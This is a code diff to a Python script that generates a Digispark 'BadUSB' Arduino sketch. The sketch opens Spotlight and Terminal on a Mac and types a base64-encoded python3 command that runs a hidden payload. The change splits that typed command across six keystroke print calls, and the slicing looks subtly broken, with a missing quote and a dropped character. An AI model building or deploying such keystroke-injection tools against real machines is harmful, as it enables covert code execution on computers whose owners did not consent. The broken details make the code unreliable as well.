@@ -1,6 +1,7 @@
 import argparse
 import sys
 import base64 
+import math
 
 CURLY_L = "{"
 CURLY_R = "}"
@@ -45,15 +46,20 @@ if(args.python):
   write_file("d.py", payload)
 
 else: #generate Arduino sketch
-  INITIAL_DELAY = 700
+  INITIAL_DELAY = 1000
   PAYLOAD_BYTES = payload.encode("ascii")
   ENCODED_BYTES = base64.b64encode(PAYLOAD_BYTES)
   ENCODED_PAYLOAD = ENCODED_BYTES.decode("ascii") #encoded payload to be loaded in Ardiono file
-  ARDUINO_SKETCH_LOOP = f"\n\tDigiKeyboard.delay({INITIAL_DELAY});\n\tDigiKeyboard.sendKeyStroke(0);\n\tDigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);\n\tDigiKeyboard.delay(400);\n\tDigiKeyboard.print(\"Terminal\");\n\tDigiKeyboard.delay(200);\n\tDigiKeyboard.sendKeyStroke(KEY_ENTER);\n\tDigiKeyboard.delay(1500);\n\tDigiKeyboard.print(\"python3 -c \\\"$(printf '%s' '{ENCODED_PAYLOAD}' | base64 -D)\\\"\");\n\tfor(;;){CURLY_L}{CURLY_R}\n"
+  WHOLE_LINE = f"\"python3 -c \\\"$(printf '%s' '{ENCODED_PAYLOAD}' | base64 -D)\\\"\""
+  #split lines ni 6
+  lines = math.floor(len(WHOLE_LINE) / 6)
+  LINE1 = WHOLE_LINE[:lines]
+  LINE2 = WHOLE_LINE[lines:lines*2]
+  LINE3 = WHOLE_LINE[lines*2:lines*3]
+  LINE4 = WHOLE_LINE[lines*3:lines*4]
+  LINE5 = WHOLE_LINE[lines*4:lines*5]
+  LINE6 = WHOLE_LINE[lines*5:len(WHOLE_LINE)-1]
+  
+  ARDUINO_SKETCH_LOOP = f"\n\tDigiKeyboard.delay({INITIAL_DELAY});\n\tDigiKeyboard.sendKeyStroke(0);\n\tDigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);\n\tDigiKeyboard.delay(400);\n\tDigiKeyboard.print(\"Terminal\");\n\tDigiKeyboard.delay(200);\n\tDigiKeyboard.sendKeyStroke(KEY_ENTER);\n\tDigiKeyboard.delay(1500);\n\tDigiKeyboard.print({LINE1}\");\n\tDigiKeyboard.print(\"{LINE2}\");\n\tDigiKeyboard.print(\"{LINE3}\");\n\tDigiKeyboard.print(\"{LINE4}\");\n\tDigiKeyboard.print(\"{LINE5}\");\n\tDigiKeyboard.print(\"{LINE6}\");\n\tfor(;;){CURLY_L}{CURLY_R}\n"
   ARDIONO_FILE_CONTENT = f"#include \"DigiKeyboard.h\"\n\nvoid setup() {CURLY_L}{CURLY_R}\n\nvoid loop() {CURLY_L}{ARDUINO_SKETCH_LOOP}{CURLY_R}\n"
   write_file("digispark_sketch.ino", ARDIONO_FILE_CONTENT)
-
-
-  
-
-  # \tDigiKeyboard.delay(1000);\n\tDigiKeyboard.sendKeyStroke(0);\n\tDigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);\n\tDigiKeyboard.delay(400);\n\tDigiKeyboard.print("Terminal");\n\tDigiKeyboard.delay(200);\n\tDigiKeyboard.sendKeyStroke(KEY_ENTER);\n\tDigiKeyboard.delay(1500);\n\tDigiKeyboard.print("python3 -c \"$(printf '%s' '{ENCODED_PAYLOAD}' | base64 -D)\"");\n\tfor(;;){ /*empty*/ }\n
